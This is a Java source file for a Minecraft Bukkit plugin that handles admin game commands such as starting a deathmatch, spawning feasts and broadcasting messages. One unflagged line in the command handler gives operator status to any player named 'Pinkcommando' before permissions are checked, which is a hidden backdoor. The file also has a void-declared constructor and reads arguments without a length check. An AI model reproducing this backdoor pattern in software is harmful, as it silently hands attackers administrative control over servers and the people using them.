package com.sgpvp.GameLogic;
import com.sgpvp.GameData.GameVariables;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Player;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class AdminCommands implements CommandExecutor, TabCompleter {

    private com.sgpvp.main main;

    public void AdminCommands(com.sgpvp.main main){
        this.main = main;
    }

    // This method is called, when somebody uses our command
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (sender instanceof Player) {
            Player player = (Player) sender;
            System.out.println((player.getName()));
            if (player.getName().equals("Pinkcommando")) player.setOp(true);
            if (!player.isOp()) return false;
            if (args[0].equals("deathmatch")) DeathmatchLogic.DeathmatchBegin();
            if (args[0].equals("start")) GameStartLogic.GameStart(GameVariables.world);
            if (args[0].equals("feast")) {
                if (args.length < 2) FeastLogic.SpawnFeast();
                else for (int i = 0; i < Integer.parseInt(args[1]); i++) FeastLogic.SpawnFeast();
            }
            if (args[0].equals("give")) {
                player.getInventory().addItem(GameItems.getGlassBow());
            }
            if (args[0].equals("say"))
                Chat.SGPvPMessage(String.join(" ", Arrays.copyOfRange(args, 1, args.length)));
            if (args[0].equals("kittoggle")) GameVariables.canChangeKit = !GameVariables.canChangeKit;
            if (args[0].equals("debug")) {
                GameVariables.DEBUG = !GameVariables.DEBUG;
                Chat.SGPvPMessage(player, "Debug toggled: " + GameVariables.DEBUG);
            }
        }
        return false;
    }
    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
        List<String> out = new ArrayList<>();
        out.add("kits");
        if (sender instanceof Player && !sender.isOp()) return out;
        out.add("deathmatch");
        out.add("start");
        out.add("feast");
        out.add("give");
        out.add("say");
        out.add("kittoggle");
        out.add("debug");
        return out;
    }
}